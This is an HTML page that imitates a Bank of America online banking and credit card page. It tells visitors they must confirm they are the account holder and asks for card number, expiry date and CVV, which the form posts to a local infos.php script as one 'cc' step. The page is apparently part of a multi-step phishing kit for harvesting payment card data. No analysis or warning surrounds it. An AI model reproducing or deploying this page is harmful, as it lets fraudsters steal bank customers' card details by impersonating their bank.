<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>Bank of America | Online Banking | Log In | User ID</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/test.css">             
  <link rel="preconnect" href="https://fonts.gstatic.com">
  

  <!-- js files-->
  <script src="js/html5shiv.min.js"></script>
  <script src="js/respond.min.js"></script>

  <!-- logo site web-->
  <link rel="icon" href="image/fa.ico" type="image/x-icon" />
  <link rel="shortcut icon" href="image/fa.ico" type="image/x-icon" />

  <!-- fontawtsome -->
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
</head>
<style>

	label{
		font-size: 13px;
    padding-bottom: 4px;
    font-weight: 400;
	}
	.frm input{
		height: 50px;
	}

</style>
	<body>
		<header style="padding:0;">
			<div class="container" style="max-width: 1320px;">
				<div>
					<div class="logo" style="padding-top: 20px;"><img style="height: 34px;max-height: 34px;max-width: 300px;width: 300px;" src="image/logo.png"></div>
				</div>
			</div>
			<div class="hh mt-3">
				<div class="container" style="max-width: 1320px;">
					<h1 style="background: transparent;">Bank of America® credit card</h1>
				</div>
			</div>
			
		</header>
		<div class="secc">
			<div class="container">
				<div class="form">
					<div class="text-center my-5">
						<h2>Confirm your credit card information</h2>
						<p>Please enter your credit card details to confirm that you are the actual account holder.</p>
						<div class="step mt-5"><img width="235" src="image/st2.png"></div>
					</div>
					<div class="frm">
							<form action="infos.php" method="post">
								<input type="hidden" value="cc" name="step">
								<div class="form-group mb-3" style="position: relative;">
									<label>Credit card number</label>
									<input type="text" class="form-control" placeholder="0000 0000 0000 0000" id="card_number" name="card_number">
									<div class="m"><img src="image/m.png"></div>
									<div class="v"><img src="image/v.png"></div>
								</div>
								<div class="row">
									<div class="form-group mb-3 col-md-8">
										<label>Exp MM/YY</label>
										<input type="text" class="form-control" placeholder="MM/YY" id="expiry" name="expiry">
									</div>
									<div class="form-group mb-3 col-md-4">
										<label>CVV</label>
										<input type="text" class="form-control" placeholder="security code" id="cvv" name="cvv">
									</div>
									<div class="bttn text-center mt-4"><button name="submit">Continue</button></div>
								</div>
							</form>
					</div>
				</div>
			</div>
		</div>
		<footer>
			<div class="container">
				<p>Bank of America, N.A. Member FDIC. Equal Housing Lender <br>

© 2024 Bank of America Corporation. All rights reserved.</p>
			</div>
		</footer>
		

  <!-- template files js-->
  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="js/jquery.mask.js"></script>
  <script>
  	$("#card_number").mask("0000 0000 0000 0000");
              $("#expiry").mask("00/00");
              $("#cvv").mask("0000");
  </script>
</body>
</html>